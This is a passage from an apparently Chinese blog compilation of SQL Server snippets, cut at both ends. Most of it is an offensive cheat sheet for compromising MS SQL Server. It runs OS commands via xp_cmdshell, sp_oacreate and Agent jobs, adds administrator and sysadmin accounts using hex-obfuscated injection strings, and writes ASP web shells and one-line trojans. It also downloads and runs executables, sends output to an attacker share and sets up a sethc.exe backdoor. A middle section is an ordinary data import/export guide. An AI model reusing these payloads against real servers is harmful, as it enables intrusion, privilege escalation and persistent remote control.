mssqlserver,然后把xplog70.dll(SQL97下用xpsql70.dll)删了<br>再把服务打开就可以了<br><br>2)<br>看了上面的你就明白了xp_cmdshell最终是可以被删除的，没别的办法了吗?<br>有写注册表三:<br>xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\currentversion\run’, ‘czy82’,’REG_SZ’, net user czy bb /add<br><br>其实注册表还有好几个地方可以写的比如说注册表中的WEB浏览设置<br>用写注册表的办法不好的地方是不但没有回显而且不能马上运行，实不实用我也不知道了<br><br>3)<br>declare @s int<br>exec sp_oacreate “wscript.shell”,@s out<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c echo open asp.7i24.com&gt;c:\a.txt”<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c echo 123321&gt;&gt;c:\a.txt”<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c echo 123321&gt;&gt;c:\a.txt”<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c echo get server.exe&gt;&gt;c:\a.txt”<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c echo close&gt;&gt;c:\a.txt”<br>–exec sp_oamethod @s,”run”,NULL,”cmd.exe /c ftp -s:c:\a.txt”<br>exec sp_oamethod @s,”run”,NULL,”cmd.exe /c server”<br><br>对了正如你看到的我们还可以使用sp_oacreate和sp_oamethod，在它们的作用下我们可以<br>调用系统的控件比如说fso,wsh,shell什么的,但是有个问题是并不能象xp_cmdshell那样<br>马上看到结果，真的不能吗看下面的:<br><br>declare @s int,@o int ,@f int,@str nvarchar(4000)<br>/</em>exec sp_oacreate “wscript.shell”,@s out<br>exec sp_oamethod @s,”run”,NULL,”cmd.exe /c net user&gt;c:\temp.txt”*/<br>exec sp_oacreate “scripting.filesystemobject”, @o out<br>exec sp_oamethod @o, “opentextfile”, @f out,”c:\temp.txt”, 1<br>exec sp_oamethod @f, “readall”,@str out<br>print @str<br><br>先执行注解内的然后执行外面的其实原理很简单就是利用&gt;把结果写到一个文件中然后用<br>fso来读出来!很实用的<br><br>——————————————<br>写到这儿该作个总结了上面三个办法可能大家都知道吧<br>下面的可能知道的人就少了<br>——————————————<br><br>4)<br>use msdb; –这儿不要是master哟<br>exec sp_add_job @job_name=’czy82’;<br>exec sp_add_jobstep @job_name=’czy82’,@step_name = ‘Exec my sql’,@subsystem=’CMDEXEC’,@command=’dir c:\&gt;c:\b.txt’;<br>exec sp_add_jobserver @job_name = ‘czy82’,@server_name = ‘smscomputer’;<br>exec sp_start_job @job_name=’czy82’;<br><br>利用MSSQL的作业处理也是可以执行命令的而且如果上面的subsystem的参数是tsql，后面的我们就可以<br>执行tsql语句了.<br>对于这几个储存过程的使用第一在@server_name我们要指定你的sql的服务器名<br>第二系统的sqlserveragent服务必须打开(默认没打开的气人了吧)<br>net start SQLSERVERAGENT<br><br>对于这个东东还有一个地方不同就是public也可以执行..同这儿也是有系统洞洞的看下面的<br>USE msdb<br>EXEC sp_add_job @job_name = ‘GetSystemOnSQL’,<br>@enabled = 1,<br>@description = ‘This will give a low privileged user access to<br>xp_cmdshell’,<br>@delete_level = 1<br>EXEC sp_add_jobstep @job_name = ‘GetSystemOnSQL’,<br>@step_name = ‘Exec my sql’,<br>@subsystem = ‘TSQL’,<br>@command = ‘exec master..xp_execresultset N’’select ‘’’’exec<br>master..xp_cmdshell “dir &gt; c:\agent-job-results.txt”‘’’’’’,N’’Master’’’<br>EXEC sp_add_jobserver @job_name = ‘GetSystemOnSQL’,<br>@server_name = ‘你的SQL的服务器名’<br>EXEC sp_start_job @job_name = ‘GetSystemOnSQL’<br><br>不要怀疑上面的代码，我是测试成功了的!这儿我们要注意xp_execresultset就是因为它所以<br>才让我们可以以public执行xp_cmdshell<br><br>5)关于Microsoft SQL Agent Jobs任意文件可删除覆盖漏洞(public用户也可以)<br>在安焦有文章:[url=<a href="http://www.xfocus.net/vuln/vul_view.php?vul_id=2968]链接标记http://www.xfocus.net/vuln/vul_view.php?vul_id=2968[/url" target="_blank" rel="external">http://www.xfocus.net/vuln/vul_view.php?vul_id=2968]链接标记http://www.xfocus.net/vuln/vul_view.php?vul_id=2968[/url</a>]<br><br>USE msdb<br>EXEC sp_add_job @job_name = ‘ArbitraryFileCreate’,<br>@enabled = 1,<br>@description = ‘This will create a file called c:\sqlafc123.txt’,<br>@delete_level = 1<br>EXEC sp_add_jobstep @job_name = ‘ArbitraryFileCreate’,<br>@step_name = ‘SQLAFC’,<br>@subsystem = ‘TSQL’,<br>@command = ‘select ‘’hello, this file was created by the SQL Agent.’’’,<br>@output_file_name = ‘c:\sqlafc123.txt’<br>EXEC sp_add_jobserver @job_name = ‘ArbitraryFileCreate’,<br>@server_name = ‘SERVER_NAME’<br>EXEC sp_start_job @job_name = ‘ArbitraryFileCreate’<br><br>如果subsystem选的是:tsql，在生成的文件的头部有如下内容<br><br>??揂rbitraryFileCreate? ? 1 ?,揝QLAFC? ???? 2003-02-07 18:24:19<br>———————————————-<br>hello, this file was created by the SQL Agent.<br><br>(1 ?????)<br><br>所以我建议要生成文件最好subsystem选cmdexec,如果利用得好我们可以写一个有添加管理员<br>命令的vbs文件到启动目录!<br><br>6)关于sp_makewebtask(可以写任意内容任意文件名的文件)<br>关于sp_MScopyscriptfile 看下面的例子<br>declare @command varchar(100)<br>declare @scripfile varchar(200)<br>set concat_null_yields_null off<br>select @command=’dir c:\ &gt; “\attackerip\share\dir.txt”‘<br>select @scripfile=’c:\autoexec.bat &gt; nul” | ‘ + @command + ‘ | rd “‘<br>exec sp_MScopyscriptfile @scripfile ,’’<br><br>这两个东东都还在测试试哟<br>让MSSQL的public用户得到一个本机的web shell:)<br><br>sp_makewebtask @outputfile=’d:\sms\a.asp’,@charset=gb2312,<br>–@query=’select ‘’&lt;img src=vbscript:msgbox(now())&gt;’’’<br>–@query=’select ‘’&lt;%response.write request.servervariables(“APPL_PHYSICAL_PATH”)%&gt;’’ ‘<br>@query=’select ‘’<br>&lt;%On Error Resume Next<br>Set oscript = Server.CreateObject(“wscript.SHELL”)<br>Set oscriptNet = Server.CreateObject(“wscript.NETWORK”)<br>Set oFileSys = Server.CreateObject(“scripting.FileSystemObject”)<br>szCMD = Request.Form(“.CMD”)<br>If (szCMD &lt;&gt;””)Then<br>szTempFile = “C:\” &amp; oFileSys.GetTempName()<br>Call oscript.Run (“cmd.exe /c “ &amp; szCMD &amp; “ &gt; “ &amp; szTempFile, 0, True)<br>Set oFile = oFilesys.OpenTextFile (szTempFile, 1, False, 0)<br>End If %&gt;<br>&lt;HTML&gt;&lt;BODY&gt;&lt;FORM action=”&lt;%= Request.ServerVariables(“URL”)%&gt;” method=”POST”&gt;<br>&lt;input type=text name=”.CMD” size=45 value=”&lt;%= szCMD %&gt;”&gt;&lt;input type=submit value=”Run”&gt;<br>&lt;/FORM&gt;&lt;PRE&gt;<br>&lt;% If (IsObject(oFile))Then<br>On Error Resume Next<br>Response.Write Server.HTMLEncode(oFile.ReadAll)<br>oFile.Close<br>Call oFileSys.DeleteFile(szTempFile, True)<br>End If%&gt;<br>&lt;/BODY&gt;&lt;/HTML&gt; ‘’’</strong></pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div><br>&nbsp;<br><br>&nbsp;

SQL语句导入导出各类文件<strong><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_f1c93a66-51d0-4fb3-b351-49b362082dca" class="cnblogs_code_hide"><br><pre>/<strong>*</strong></pre></div></div></strong> 导出到excel<br>EXEC master..xp_cmdshell ‘bcp SettleDB.dbo.shanghu out c:\temp1.xls -c -q -S”GNETDATA/GNETDATA” -U”sa” -P””‘<br><br>/<strong><strong><em>*</em></strong></strong> 导入Excel<br>Select <em><br>FROM OpenDataSource( ‘Microsoft.Jet.OLEDB.4.0’,<br>‘Data Source=”c:\test.xls”;User ID=Admin;Password=;Extended properties=Excel 5.0’)…xactions<br><br>/</em>动态文件名<br>declare @fn varchar(20),@s varchar(1000)<br>set @fn = ‘c:\test.xls’<br>set @s =’’’Microsoft.Jet.OLEDB.4.0’’,<br>‘’Data Source=”‘+@fn+’”;User ID=Admin;Password=;Extended properties=Excel 5.0’’’<br>set @s = ‘Select <em> FROM OpenDataSource (‘+@s+’)…sheet1$’<br>exec(@s) 
</em>/<br><br>Select cast(cast(科目编号 as numeric(10,2)) as nvarchar(255))+’　‘ 转换后的别名<br>FROM OpenDataSource( ‘Microsoft.Jet.OLEDB.4.0’,<br>‘Data Source=”c:\test.xls”;User ID=Admin;Password=;Extended properties=Excel 5.0’)…xactions<br><br>/<strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong> EXCEL导到远程SQL<br>insert OPENDATASOURCE(<br>‘SQLOLEDB’,<br>‘Data Source=远程ip;User ID=sa;Password=密码’<br>).库名.dbo.表名 (列名1,列名2)<br>Select 列名1,列名2<br>FROM OpenDataSource( ‘Microsoft.Jet.OLEDB.4.0’,<br>‘Data Source=”c:\test.xls”;User ID=Admin;Password=;Extended properties=Excel 5.0’)…xactions<br><br>/<strong> 导入文本文件<br>EXEC master..xp_cmdshell ‘bcp dbname..tablename in c:\DT.txt -c -Sservername -Usa -Ppassword’<br><br>/</strong> 导出文本文件<br>EXEC master..xp_cmdshell ‘bcp dbname..tablename out c:\DT.txt -c -Sservername -Usa -Ppassword’<br>或<br>EXEC master..xp_cmdshell ‘bcp “Select <em> from dbname..tablename” queryout c:\DT.txt -c -Sservername -Usa -Ppassword’<br><br>导出到TXT文本，用逗号分开<br>exec master..xp_cmdshell ‘bcp “库名..表名” out “d:\tt.txt” -c -t ,-U sa -P password’<br><br>BULK Insert 库名..表名<br>FROM ‘c:\test.txt’<br>WITH (<br>FIELDTERMINATOR = ‘;’,<br>ROWTERMINATOR = ‘\n’<br>)<br><br>–/</em> dBase IV文件<br>select <em> from<br>OPENROWSET(‘MICROSOFT.JET.OLEDB.4.0’<br>,’dBase IV;HDR=NO;IMEX=2;DATABASE=C:\’,’select </em> from [客户资料4.dbf]’)<br>–<em>/<br><br>–/</em> dBase III文件<br>select <em> from<br>OPENROWSET(‘MICROSOFT.JET.OLEDB.4.0’<br>,’dBase III;HDR=NO;IMEX=2;DATABASE=C:\’,’select </em> from [客户资料3.dbf]’)<br>–<em>/<br><br>–/</em> FoxPro 数据库<br>select <em> from openrowset(‘MSDASQL’,<br>‘Driver=Microsoft Visual FoxPro Driver;SourceType=DBF;SourceDB=c:\’,<br>‘select </em> from [aa.DBF]’)<br>–<em>/<br><br>/<strong><strong><strong>**</strong></strong></strong>导入DBF文件<strong><strong><strong><em>**</em></strong></strong></strong>/<br>select </em> from openrowset(‘MSDASQL’,<br>‘Driver=Microsoft Visual FoxPro Driver;<br>SourceDB=e:\VFP98\data;<br>SourceType=DBF’,<br>‘select <em> from customer where country != “USA” order by country’)<br>go<br>/<strong><strong><strong><em>**</em></strong></strong></strong></em> 导出到DBF <strong><strong><strong><em>*</em></strong></strong></strong>/<br>如果要导出数据到已经生成结构(即现存的)FOXPRO表中,可以直接用下面的SQL语句<br><br>insert into openrowset(‘MSDASQL’,<br>‘Driver=Microsoft Visual FoxPro Driver;SourceType=DBF;SourceDB=c:\’,<br>‘select <em> from [aa.DBF]’)<br>select </em> from 表<br><br>说明:<br>SourceDB=c:\ 指定foxpro表所在的文件夹<br>aa.DBF 指定foxpro表的文件名.<br><br>/<strong><strong><strong>*</strong></strong></strong>导出到Access<strong><strong><strong><strong><em>**</em></strong></strong></strong></strong>/<br>insert into openrowset(‘Microsoft.Jet.OLEDB.4.0’,<br>‘x:\A.mdb’;’admin’;’’,A表) select <em> from 数据库名..B表<br><br>/<strong><strong><em>**</em></strong></strong></em>导入Access<strong><strong><strong><strong><em>**</em></strong></strong></strong></strong>/<br>insert into B表 selet <em> from openrowset(‘Microsoft.Jet.OLEDB.4.0’,<br>‘x:\A.mdb’;’admin’;’’,A表)<br><br>文件名为参数<br>declare @fname varchar(20)<br>set @fname = ‘d:\test.mdb’<br>exec(‘Select a.</em> FROM opendatasource(‘’Microsoft.Jet.OLEDB.4.0’’,<br>‘’’+@fname+’’’;’’admin’’;’’’’, topics) as a ‘)<br><br>Select <em><br>FROM OpenDataSource( ‘Microsoft.Jet.OLEDB.4.0’,<br>‘Data Source=”f:\northwind.mdb”;Jet OLEDB:Database Password=123;User ID=Admin;Password=;’)…产品<br><br><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></em> 导入 xml　文件<br><br>DECLARE @idoc int<br>DECLARE @doc varchar(1000)<br>–sample XML document<br>SET @doc =’<br>&lt;root&gt;<br>&lt;Customer cid= “C1” name=”Janine” city=”Issaquah”&gt;<br>&lt;Order oid=”O1” date=”1/20/1996” amount=”3.5” /&gt;<br>&lt;Order oid=”O2” date=”4/30/1997” amount=”13.4”&gt;Customer was very satisfied<br>&lt;/Order&gt;<br>&lt;/Customer&gt;<br>&lt;Customer cid=”C2” name=”Ursula” city=”Oelde” &gt;<br>&lt;Order oid=”O3” date=”7/14/1999” amount=”100” note=”Wrap it blue<br>white red”&gt;<br>&lt;Urgency&gt;Important&lt;/Urgency&gt;<br>Happy Customer.<br>&lt;/Order&gt;<br>&lt;Order oid=”O4” date=”1/20/1996” amount=”10000”/&gt;<br>&lt;/Customer&gt;<br>&lt;/root&gt;<br>‘<br>– Create an internal representation of the XML document.<br>EXEC sp_xml_preparedocument @idoc OUTPUT, @doc<br><br>– Execute a Select statement using OPENXML rowset provider.<br>Select <em><br>FROM OPENXML (@idoc, ‘/root/Customer/Order’, 1)<br>WITH (oid char(5),<br>amount float,<br>comment ntext ‘text()’)<br>EXEC sp_xml_removedocument @idoc<br><br>???????<br><br>/<strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong>Excel导到Txt<strong><strong><strong><strong><strong><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></strong></strong></strong></strong></strong>/<br>想用<br>select </em> into opendatasource(…) from opendatasource(…)<br>实现将一个Excel文件内容导入到一个文本文件<br><br>假设Excel中有两列，第一列为姓名，第二列为很行帐号(16位)<br>且银行帐号导出到文本文件后分两部分，前8位和后8位分开。<br><br>邹健：<br>如果要用你上面的语句插入的话,文本文件必须存在,而且有一行:姓名,银行账号1,银行账号2<br>然后就可以用下面的语句进行插入<br>注意文件名和目录根据你的实际情况进行修改.<br><br>insert into<br>opendatasource(‘MICROSOFT.JET.OLEDB.4.0’<br>,’Text;HDR=Yes;DATABASE=C:\’<br>)…[aa#txt]<br>–,aa#txt)<br>–<em>/<br>select 姓名,银行账号1=left(银行账号,8),银行账号2=right(银行账号,8)<br>from<br>opendatasource(‘MICROSOFT.JET.OLEDB.4.0’<br>,’Excel 5.0;HDR=YES;IMEX=2;DATABASE=c:\a.xls’<br>–,Sheet1$)<br>)…[Sheet1$]<br><br>如果你想直接插入并生成文本文件,就要用bcp<br><br>declare @sql varchar(8000),@tbname varchar(50)<br><br>–首先将excel表内容导入到一个全局临时表<br>select @tbname=’[##temp’+cast(newid() as varchar(40))+’]’<br>,@sql=’select 姓名,银行账号1=left(银行账号,8),银行账号2=right(银行账号,8)<br>into ‘+@tbname+’ from<br>opendatasource(‘’MICROSOFT.JET.OLEDB.4.0’’<br>,’’Excel 5.0;HDR=YES;IMEX=2;DATABASE=c:\a.xls’’<br>)…[Sheet1$]’<br>exec(@sql)<br><br>–然后用bcp从全局临时表导出到文本文件<br>set @sql=’bcp “‘+@tbname+’” out “c:\aa.txt” /S”(local)” /P”” /c’<br>exec master..xp_cmdshell @sql<br><br>–删除临时表<br>exec(‘drop table ‘+@tbname)<br><br>/<strong><strong><strong><strong><em>**</em></strong></strong></strong></strong>导整个数据库<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em>/<br><br>用bcp实现的存储过程<br><br>/<em><br>实现数据导入/导出的存储过程<br>根据不同的参数,可以实现导入/导出整个数据库/单个表<br>调用示例:<br>–导出调用示例<br>—-导出单个表<br>exec file2table ‘zj’,’’,’’,’xzkh_sa..地区资料’,’c:\zj.txt’,1<br>—-导出整个数据库<br>exec file2table ‘zj’,’’,’’,’xzkh_sa’,’C:\docman’,1<br><br>–导入调用示例<br>—-导入单个表<br>exec file2table ‘zj’,’’,’’,’xzkh_sa..地区资料’,’c:\zj.txt’,0<br>—-导入整个数据库<br>exec file2table ‘zj’,’’,’’,’xzkh_sa’,’C:\docman’,0 

</em>/<br>if exists(select 1 from sysobjects where name=’File2Table’ and objectproperty(id,’IsProcedure’)=1)<br>drop procedure File2Table<br>go<br>create procedure File2Table<br>@servername varchar(200) –服务器名<br>,@username varchar(200) –用户名,如果用NT验证方式,则为空’’<br>,@password varchar(200) –密码<br>,@tbname varchar(500) –数据库.dbo.表名,如果不指定:.dbo.表名,则导出数据库的所有用户表<br>,@filename varchar(1000) –导入/导出路径/文件名,如果@tbname参数指明是导出整个数据库,则这个参数是文件存放路径,文件名自动用表名.txt<br>,@isout bit –1为导出,0为导入<br>as<br>declare @sql varchar(8000)<br><br>if @tbname like ‘%.%.%’ –如果指定了表名,则直接导出单个表<br>begin<br>set @sql=’bcp ‘+@tbname<br>+case when @isout=1 then ‘ out ‘ else ‘ in ‘ end<br>+’ “‘+@filename+’” /w’<br>+’ /S ‘+@servername<br>+case when isnull(@username,’’)=’’ then ‘’ else ‘ /U ‘+@username end<br>+’ /P ‘+isnull(@password,’’)<br>exec master..xp_cmdshell @sql<br>end<br>else<br>begin –导出整个数据库,定义游标,取出所有的用户表<br>declare @m_tbname varchar(250)<br>if right(@filename,1)&lt;&gt;’\’ set @filename=@filename+’\’<br><br>set @m_tbname=’declare #tb cursor for select name from ‘+@tbname+’..sysobjects where xtype=’’U’’’<br>exec(@m_tbname)<br>open #tb<br>fetch next from #tb into @m_tbname<br>while @@fetch_status=0<br>begin<br>set @sql=’bcp ‘+@tbname+’..’+@m_tbname<br>+case when @isout=1 then ‘ out ‘ else ‘ in ‘ end<br>+’ “‘+@filename+@m_tbname+’.txt “ /w’<br>+’ /S ‘+@servername<br>+case when isnull(@username,’’)=’’ then ‘’ else ‘ /U ‘+@username end<br>+’ /P ‘+isnull(@password,’’)<br>exec master..xp_cmdshell @sql<br>fetch next from #tb into @m_tbname<br>end<br>close #tb<br>deallocate #tb<br>end<br>go<br><br>/<strong><strong><strong>*</strong></strong></strong> oracle <strong><strong><strong>**</strong></strong></strong>/<br>EXEC sp_addlinkedserver ‘OracleSvr’,<br>‘Oracle 7.3’,<br>‘MSDAORA’,<br>‘ORCLDB’<br>GO<br><br>delete from openquery(mailser,’select <em> from yulin’)<br>select </em> from openquery(mailser,’select <em> from yulin’)<br>update openquery(mailser,’select </em> from yulin where id=15’)set disorder=555,catago=888<br>insert into openquery(mailser,’select disorder,catago from yulin’)values(333,777)<br><br>补充：<br>对于用bcp导出,是没有字段名的.<br>用openrowset导出,需要事先建好表.<br>用openrowset导入,除ACCESS及EXCEL外,均不支持非本机数据导入<br><br><span class="cnblogs_code_collapse">View Code</span><br>&nbsp;<br><br>&nbsp;<br><br><strong>SQL存储过程</strong><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_b9720e7c-aeb9-4c66-8816-2ab61e7e16c3" class="cnblogs_code_hide"><br><pre>sql2005恢复xp_cmdshell<br>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;<br>关闭:EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;<br>零、<br>– 添加SA用户–<br><br>1、exec master.dbo.sp_addlogin system;<br>2、exec master.dbo.sp_addlogin system,system;<br>3、exec master.dbo.sp_addsrvrolemember itpro,sysadmin<br><br>防注入 sa:itpro pass:itpro<br>declare @s varchar(4000) set @s=cast(0x65786563206d61737465722e64626f2e73705f6164646c6f67696e20697470726f as varchar(4000));exec(@s); declare @c varchar(4000) set @c=cast(0x65786563206d61737465722e64626f2e73705f70617373776f7264206e756c6c2c697470726f2c697470726f as varchar(4000));exec(@c); declare @a varchar(4000) set @a=cast(0x65786563206d61737465722e64626f2e73705f616464737276726f6c656d656d6265722027697470726f272c2073797361646d696e as varchar(4000));exec(@a);– and 1=1<br><br>防注入 sa:system pass:system<br>declare @s varchar(4000) set @s=cast(0x65786563206d61737465722e64626f2e73705f6164646c6f67696e2073797374656d2c73797374656d as varchar(4000));exec(@s);declare @a varchar(4000) set @a=cast(0x65786563206d61737465722e64626f2e73705f616464737276726f6c656d656d626572202773797374656d272c2073797361646d696e as varchar(4000));exec(@a);– and 1=1<br>一、<br>-恢复存储过程-<br><br>use master<br>exec sp_addextendedproc xp_cmdshell,’xp_cmdshell.dll’<br>exec sp_dropextendedproc “xp_cmdshell”<br>exec sp_addextendedproc ‘xp_cmdshell’, ‘xpsql70.dll’<br>exec sp_dropextendedproc ‘xp_cmdshell’<br>exec sp_addextendedproc ‘xp_cmdshell’,’xpweb70.dll’<br>exec sp_addextendedproc xp_dirtree,’xpstar.dll’<br>exec sp_addextendedproc xp_enumgroups,’xplog70.dll’<br>exec sp_addextendedproc xp_fixeddrives,’xpstar.dll’<br>exec sp_addextendedproc xp_loginconfig,’xplog70.dll’<br>exec sp_addextendedproc xp_enumerrorlogs,’xpstar.dll’<br>exec sp_addextendedproc xp_getfiledetails,’xpstar.dll’<br>exec sp_addextendedproc sp_OACreate,’odsole70.dll’<br>exec sp_addextendedproc sp_OADestroy,’odsole70.dll’<br>exec sp_addextendedproc sp_OAGetErrorInfo,’odsole70.dll’<br>exec sp_addextendedproc sp_OAGetProperty,’odsole70.dll’<br>exec sp_addextendedproc sp_OAMethod,’odsole70.dll’<br>exec sp_addextendedproc sp_OASetProperty,’odsole70.dll’<br>exec sp_addextendedproc sp_OAStop,’odsole70.dll’<br>exec sp_addextendedproc xp_regaddmultistring,’xpstar.dll’<br>exec sp_addextendedproc xp_regdeletekey,’xpstar.dll’<br>exec sp_addextendedproc xp_regdeletevalue,’xpstar.dll’<br>exec sp_addextendedproc xp_regenumvalues,’xpstar.dll’<br>exec sp_addextendedproc xp_regread,’xpstar.dll’<br>exec sp_addextendedproc xp_regremovemultistring,’xpstar.dll’<br>exec sp_addextendedproc xp_regwrite,’xpstar.dll’<br>exec sp_addextendedproc xp_availablemedia,’xpstar.dll’<br><br>恢复cmdshell防注入<br>declare @a varchar(255),@b varchar(255),@c varchar(255);<br>set @a=0x6D61737465722E2E73705F616464657874656E64656470726F63;<br>set @b=0x78705F636D647368656C6C;<br>set @c=0x78706C6F6737302E646C6C;<br>exec @a @b,@c<br><br>二、<br>–恢复sp_addextendedproc存储过程–<br><br>create procedure sp_addextendedproc — 1996/08/30 20:13<br>@functname nvarchar(517),/<em> (owner.)name of function to call </em>/ @dllname varchar(255)/<em> name of DLL containing function </em>/ as<br>set implicit_transactions off<br>if @@trancount &gt; 0<br>begin<br>raiserror(15002,-1,-1,’sp_addextendedproc’)<br>return (1)<br>end<br>dbcc addextendedproc( @functname, @dllname)<br>return (0) – sp_addextendedproc<br>GO<br><br>三、<br>–使用存储过程加管理方法–<br><br>1、master.dbo.xp_cmdshell ‘net user itpro gmasfm &amp;&amp; net localgroup administrators itpro /add’<br>2、EXEC sp_resolve_logins ‘text’, ‘e:\asp\”&amp;net user admina admin /add&amp;net localgroup administrators admina /add&amp;dir “e:\asp’, ‘1.asp’<br>3、DECLARE @shell INT EXEC SP_OAcreate ‘wscript.shell’,@shell OUTPUT EXEC SP_OAMETHOD<br>@shell,’run’,null, ‘C:\WINdows\system32\cmd.exe /c net user sadfish fish /add’<br><br>四、<br>– 导出文件的存储过程  –<br><br>DECLARE @shell INT EXEC SP_OAcreate ‘wscript.shell’,@shell OUTPUT EXEC SP_OAMETHOD @shell,’run’,null, ‘C:\WINdows\system32\cmd.exe /c netstat -an &gt;c:\1.txt’<br><br>五、<br>–  读取文件的存储过程   –<br><br>declare @o int, @f int, @t int, @ret int<br>declare @line varchar(8000)<br>exec sp_oacreate ‘scripting.filesystemobject’, @o out<br>exec sp_oamethod @o, ‘opentextfile’, @f out, ‘c:\1.txt’, 1<br>exec @ret = sp_oamethod @f, ‘readline’, @line out<br>while( @ret = 0 )<br>begin<br>print @line<br>exec @ret = sp_oamethod @f, ‘readline’, @line out<br>end<br><br>六、<br>—–写一句话木马—–<br><br>declare @o int, @f int, @t int, @ret int<br>exec sp_oacreate ‘scripting.filesystemobject’, @o out<br>exec sp_oamethod @o, ‘createtextfile’, @f out, ‘c:\Inetpub\tianhong\2.asp’, 1<br>exec @ret = sp_oamethod @f, ‘writeline’, NULL,<br>‘&lt;%execute(request(“a”))%&gt;’     ‘ ‘ 单引号为要写的内容<br>&lt;%25 if request(“x”)&lt;&gt;”” then execute(request(“x”))%25&gt;<br><br>防注入写入法<br>declare @a int,@b int,@c varchar(255),@d varchar(255),@e varchar(255),@f varchar(255),@g varchar(255),@h varchar(255),@i varchar(255),@j varchar(255);<br>set @c=0x6D61737465722E2E73705F6F61637265617465;<br>set @d=0x6D61737465722E2E73705F6F616D6574686F64;<br>set @e=0x536372697074696E672E46696C6573797374656D4F626A656374;<br>set @f=0x4372656174655465787446696C65;<br>set @g=0x433A5C496E65747075625C73797374656D2E617370;<br>set @h=0x74727565;<br>set @i=0x7772697465;<br>set @j=0x3C256576616C20726571756573742822582229253E;<br>exec @c @e,@a output;<br>exec @d @a,@f,@b output,@g,@h;<br>exec @d @b,@i,null,@j<br><br>七、<br>—–写一句话木马—–<br><br>declare @s nvarchar(4000);select @s=0x730065006c00650063007400200027003c00250045007800650063007500740065002800720065007100750065007300740028002200610022002900290025003e000d000a002700;exec sp_makewebtask 0x43003a005c007a00770065006c006c002e00610073007000, @s;– and% 1=1<br>在上面一样;exec%20sp_makewebtask%20’d:\zjkdj\zjkdj\zjkds\bake.asp,’%20select%20’’&lt;%25execute(request(“a”))%25&gt;’’%20’;–<br><br>八、<br>—SA沙盒模式提权—–<br><br>1、exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,0;–<br><br>2、Select <em> From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database=c:\windows\system32\ias\ias.mdb’,’select shell(“net user itpro gmasfm /add”)’);<br><br>九、<br>—–另类SA提权—–<br><br>2、declare @oo int<br>exec sp_oacreate ‘scripting.filesystemobject’, @oo out<br>exec sp_oamethod @oo, ‘copyfile’,null,’c:\windows\system32\sethc.exe’ ,’c:\windows\system32\dllcache\sethc.exe’;<br>1、declare @o int<br>exec sp_oacreate ‘scripting.filesystemobject’, @o out<br>exec sp_oamethod @o, ‘copyfile’,null,’c:\windows\explorer.exe’ ,’c:\windows\system32\sethc.exe’;<br><br>DECLARE @o int<br>DECLARE @z int<br>EXEC sp_OACreate ‘Shell.Users’,@o OUT<br>EXEC sp_OAMethod @o, ‘Create’, @z OUT, ‘test’<br>EXEC sp_OASetProperty  @z, ‘setting’, 3 , ‘AccountType’<br>EXEC sp_OAMethod @z, ‘ChangePassword’,NULL , ‘123456’, ‘’<br><br>十、<br>–导出注册表–<br><br>1、drop table [regdir];create table <a href="value nvarchar(1000">regdir</a> null,data nvarchar(1000) null)–<br><br>2、delete [regdir];insert [regdir]exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEM\RAdmin\v2.0\Server\Parameters’,’port’<br><br>十一、<br>—下载程序—–<br><br>1、declare @b varbinary(8000),@hr int,@http int,@down int exec sp_oacreate [microsoft.xmlhttp],@http output exec @hr = sp_oamethod @http,[open],null,[get],[[url=<a href="http://192.168.1.6:800/wwwroot.rar]链接标记http://192.168.1.6:800/wwwroot.rar[/url]],0" target="_blank" rel="external">http://192.168.1.6:800/wwwroot.rar]链接标记http://192.168.1.6:800/wwwroot.rar[/url]],0</a> exec @hr = sp_oamethod @http,[send],null exec @hr=sp_oagetproperty @http,[responsebody],@b output exec @hr=sp_oacreate [adodb.stream],@down output exec @hr=sp_oasetproperty @down,[type],1 exec @hr=sp_oasetproperty @down,[mode],3 exec @hr=sp_oamethod @down,[open],null exec @hr=sp_oamethod @down,[write],null,@b exec @hr=sp_oamethod @down,[savetofile],null,[c:/a.exe],1 ;– and 1=1<br><br>十二、<br>-Log备份WebShell-<br><br>alter database master set RECOVERY FULL<br>create table cmd (a image)–<br>backup log master to disk = ‘c:\cmd’ with init<br>insert into cmd (a) values (‘&lt;%eval(request(“a”)):response.end%&gt;’)–<br>backup log master to disk = ‘C:\Inetpub\wwwroot\ri3.asp’–<br>drop table cmd–<br>2\<br><br>use mir<br>alter database mir set RECOVERY FULL –<br>create table cmd8 (a image)–<br>backup log mir to disk = ‘c:\cmd8’ with init –<br>insert into cmd8 (a) values (‘&lt;%eval(request(“a”)):response.end%&gt;’)–<br>backup log mir to disk = ‘c:\backup.asp’–<br>drop table cmd8–<br>alter database mir set RECOVERY SIMPLE –<br>3\<br>create/<strong>/table/</strong>/[dbo].[shit_tmp]/<strong>/([cmd]/</strong>/[image])–<br>declare/<strong>/@a/</strong>/sysname,@s/<strong>/nvarchar(4000)/</strong>/select/<strong>/@a=db_name(),@s=0x6C0061006F007A0068006F007500/</strong>/backup/<strong>/log/</strong>/@a/<strong>/to/</strong>/disk/<strong>/=/</strong>/@s/<strong>/with/</strong>/init,no_truncate–<br>insert/<strong>/into/</strong>/<a 